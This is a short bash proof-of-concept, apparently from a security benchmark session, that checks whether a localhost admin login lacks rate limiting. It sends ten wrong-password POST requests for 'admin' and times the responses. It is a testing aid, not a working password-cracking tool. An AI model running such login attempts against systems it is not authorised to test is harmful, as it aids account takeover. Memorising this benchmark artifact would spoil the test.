#!/bin/bash
# POC: Demonstrates brute force vulnerability on admin login by performing rapid login attempts without rate limiting or account lockout
# Target: ./repo
# Created: 2025-11-07T16:17:48.960Z
# Session: benchmark-XBEN-078-24-mhp1edzb

# POC for Missing Brute Force Protection on Admin Login
# This script demonstrates unlimited login attempts without rate limiting or lockout

TARGET_URL="http://localhost:80/admin.php"
ATTEMPTS=10
TIMING_OUTPUT="/tmp/brute_force_timing.txt"

echo "=========================================="
echo "Brute Force Protection POC"
echo "Target: $TARGET_URL"
echo "Attempts: $ATTEMPTS"
echo "=========================================="
echo ""

# Clear previous timing file
> "$TIMING_OUTPUT"

echo "Testing rapid login attempts without throttling..."
echo ""

for i in $(seq 1 $ATTEMPTS); do
    echo -n "Attempt $i: "
    
    # Record start time
    start_time=$(date +%s%N)
    
    # Perform login attempt
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -d "username=admin&password=wrongpassword$i" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    # Record end time
    end_time=$(date +%s%N)
    
    # Extract HTTP status code (last line)
    http_code=$(echo "$response" | tail -1)
    
    # Calculate response time in milliseconds
    response_time=$(( (end_time - start_time) / 1000000 ))
    
    echo "HTTP $http_code - Response time: ${response_time}ms"
    echo "$i $http_code $response_time" >> "$TIMING_OUTPUT"
done

echo ""
echo "=========================================="
echo "Analysis:"
echo "=========================================="

# Check if all attempts succeeded
all_success=$(grep "200" "$TIMING_OUTPUT" | wc -l)
echo "Successful responses (HTTP 200): $all_success/$ATTEMPTS"

# Check if response times are consistent (no rate limiting)
response_times=$(awk '{print $3}' "$TIMING_OUTPUT" | sort -n)
min_time=$(echo "$response_times" | head -1)
max_time=$(echo "$response_times" | tail -1)
avg_time=$(echo "$response_times" | awk '{sum+=$1; count++} END {print int(sum/count)}')

echo "Response time statistics:"
echo "  Minimum: ${min_time}ms"
echo "  Maximum: ${max_time}ms"
echo "  Average: ${avg_time}ms"
echo "  Variance: $(( max_time - min_time ))ms"

# Verdict
if [ "$all_success" -eq "$ATTEMPTS" ] && [ $(( max_time - min_time )) -lt 100 ]; then
    echo ""
    echo "VULNERABLE: All attempts succeeded with consistent response times."
    echo "No rate limiting or account lockout detected."
    exit 0
else
    echo ""
    echo "PROTECTED: Rate limiting or other protections may be in place."
    exit 1
fi